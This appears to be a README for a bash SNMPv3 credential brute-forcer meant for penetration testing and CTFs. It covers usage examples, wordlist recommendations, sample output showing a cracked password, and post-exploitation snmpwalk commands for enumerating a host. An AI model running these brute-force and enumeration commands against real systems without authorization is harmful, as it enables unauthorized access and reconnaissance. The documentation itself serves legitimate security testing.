# snmpv3-brute

A bash-based SNMPv3 credential brute-forcer for penetration testing and CTF engagements. Cycles through users, passwords, and auth/priv protocol combinations automatically.

## Features

- **Multi-protocol** tests MD5 and SHA authentication (configurable)
- **authPriv support**  optional DES/AES encryption brute-forcing with `-privfile`
- **Multi-user** accepts a single username or a file of usernames
- **Live progress**  real-time display of current attempt
- **Auto-logging**  timestamped log file with all valid credentials found
- **Connectivity pre-check**  detects open ports and noAuthNoPriv misconfigs
- **Next-step guidance** prints ready-to-run snmpwalk commands when creds hit

## Installation

```bash
git clone https://github.com/thehuskyhacker/snmpv3-brute.git
cd snmpv3-brute
chmod +x snmpv3-brute.sh
```

### Dependencies

- `snmpwalk` (from net-snmp)

```bash
# Debian/Ubuntu/Kali
sudo apt install snmp

# RHEL/Fedora
sudo dnf install net-snmp-utils
```

## Usage

```bash
./snmpv3-brute.sh -t <target> -u <user|userfile> -p <passfile> [options]
```

### Examples

```bash
# Single user, authNoPriv
./snmpv3-brute.sh -t 10.10.10.50 -u admin -p passwords.txt

# Multiple users from file
./snmpv3-brute.sh -t 10.10.10.50 -u users.txt -p passwords.txt

# Full authPriv brute-force (when authNoPriv fails)
./snmpv3-brute.sh -t 10.10.10.50 -u users.txt -p passwords.txt --privfile priv-passwords.txt

# SHA only, with delay between attempts
./snmpv3-brute.sh -t 10.10.10.50 -u admin -p passwords.txt --auth-protos SHA --delay 1
```

### Options

| Flag | Description | Default |
| --- | --- | --- |
| `-t, --target` | Target IP or hostname | *required* |
| `-u, --user` | Username or file of usernames | *required* |
| `-p, --passfile` | Password wordlist | *required* |
| `--privfile` | Priv password file (enables authPriv phase) | *off* |
| `--auth-protos` | Auth protocols, comma-separated | `MD5,SHA` |
| `--priv-protos` | Priv protocols, comma-separated | `DES,AES` |
| `--oid` | OID to query | `sysDescr.0` |
| `--timeout` | SNMP timeout in seconds | `3` |
| `--retries` | SNMP retries per attempt | `0` |
| `--delay` | Delay between attempts in seconds | `0` |
| `--logfile` | Output log file | auto-timestamped |

## How It Works

The tool runs in two phases:

**Phase 1 — authNoPriv:** Tests every user + password + auth protocol combination. This is the most common SNMPv3 configuration and where most hits land.

**Phase 2 — authPriv** *(optional)*: If `--privfile` is provided, tests every combination of auth password × priv password × auth protocol × priv protocol. This phase has a much larger keyspace — use a targeted wordlist.

```
Phase 1: user × password × auth_proto
Phase 2: user × password × auth_proto × priv_password × priv_proto
```

## Sample Output

```
╔══════════════════════════════════════════════════════════╗
║           SNMPv3 Credential Brute-Forcer               ║
╚══════════════════════════════════════════════════════════╝

  Target:       10.10.10.50
  Users:        1
  Passwords:    4322
  Auth protos:  MD5 SHA

  ═══ Phase 1: authNoPriv ═══

  [+] FOUND!  admin / MD5 / authNoPriv
      Auth Password: SomePassphrase123

      sysDescr:
        SNMPv2-MIB::sysDescr.0 = STRING: Linux target 5.15.0-91-generic
```

## Post-Exploitation

Once you have valid credentials, walk the full MIB tree for juicy info:

```bash
# Full MIB walk
snmpwalk -v 3 -l authNoPriv -u admin -a MD5 -A 'SomePassphrase123' 10.10.10.50

# Running processes
snmpwalk -v 3 -l authNoPriv -u admin -a MD5 -A 'SomePassphrase123' 10.10.10.50 hrSWRunName

# Network interfaces
snmpwalk -v 3 -l authNoPriv -u admin -a MD5 -A 'SomePassphrase123' 10.10.10.50 ifDescr

# Installed software
snmpwalk -v 3 -l authNoPriv -u admin -a MD5 -A 'SomePassphrase123' 10.10.10.50 hrSWInstalledName
```

## Wordlists

Recommended wordlists from SecLists:

```
/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt
```

## Disclaimer

This tool is intended for authorized penetration testing and educational purposes only. Only use against systems you have explicit permission to test. Unauthorized access to computer systems is illegal.
